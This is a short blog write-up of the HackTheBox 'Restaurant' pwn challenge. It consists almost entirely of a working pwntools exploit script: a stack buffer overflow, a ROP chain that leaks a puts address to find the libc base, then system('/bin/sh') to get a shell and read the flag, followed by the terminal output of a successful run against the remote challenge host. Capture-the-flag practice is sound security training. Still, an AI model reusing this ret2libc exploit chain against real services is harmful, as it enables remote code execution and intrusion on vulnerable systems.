---
title: Hackthebox | PWN
author: Kaiba_404
date: 2023-08-05
categories: [Hackthebox, PWN]
tags: [Hackthebox,PWN]
permalink: /Hackthebox/Chall/PWN/restaurant
---

# Restaurant




## Exploit script

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

libc = ELF("./libc.so.6",checksec=False)
elf = ELF("./restaurant", checksec=False)

p = remote("167.172.61.89",32304)

p.recvuntil(b"> ")
p.sendline(b"1")


junk = b"A"*40 


"""Leak libc address"""
rop_elf = ROP(elf)
# to print \n
# NEWLINE CHARACTER IN NEED
# https://lamecarrot.wordpress.com/2021/06/07/return-oriented-programming-rop-gnu-linux-version/
rop_elf.call(elf.plt['puts'], [next(elf.search(b""))])

rop_elf.call(elf.plt['puts'], [elf.got['puts']])

rop_elf.call((rop_elf.find_gadget(["ret"]))[0])

rop_elf.call(elf.symbols['fill'])

leak_addr = junk + rop_elf.chain()


p.recvuntil(b"> ")
p.sendline(leak_addr)

p.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.recvuntil(b"\n")
puts_addr = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))

log.info(f"leaked puts: {hex(puts_addr)}")

libc_base = puts_addr - libc.symbols['puts']
log.info("libc base address: " + hex(libc_base))

assert libc_base & 0x00000fff == 0
libc.address = libc_base



"""get shell"""
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(["ret"]))[0])
rop_libc.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])

payload_bash = junk + rop_libc.chain()

p.sendlineafter(b">" ,payload_bash)
p.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
p.sendline(b"cat flag.txt")
print(p.recvuntil(b"}"))
p.close()
```


***Result***

```bash
┌──(kali㉿kali)-[~/pwn_restaurant]
└─$ python3 exploit.py
[+] Opening connection to 167.172.61.89 on port 32304: Done
[*] Loaded 14 cached gadgets for './restaurant'
[*] leaked puts: 0x7f7e6def5aa0
[*] libc base address: 0x7f7e6de75000
[*] Loaded 199 cached gadgets for './libc.so.6'
b'AA\xaaX\xe7m~\x7fHTB{XXXXXXXXXXXXXX}'
[*] Closed connection to 167.172.61.89 port 32304
```

Flag: `HTB{XXXXXXXXXXXX}`